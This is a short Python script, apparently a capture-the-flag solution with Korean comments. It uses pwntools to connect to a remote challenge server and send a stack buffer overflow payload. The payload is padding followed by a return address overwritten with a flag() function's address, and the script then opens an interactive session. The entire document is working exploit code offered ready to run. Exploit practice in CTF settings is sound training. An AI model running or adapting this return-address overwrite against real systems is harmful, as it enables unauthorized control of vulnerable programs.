from pwn import *

p = remote("server.zeropointer.co.kr", 1007)  # 대상 바이너리 실행

flag_func_addr = 0x00000000004012c2  # flag 함수 오프셋 (제공된 주소)

payload = b"\x00" * 0x20  # 32바이트 (버퍼 크기 오버플로우)
payload += b"B" * 8     # 리턴 주소까지 덮기 (64비트 환경에서는 8바이트)
payload += p64(flag_func_addr)  # 리턴 주소를 flag() 함수 주소로 변경

p.sendline(payload)
p.interactive()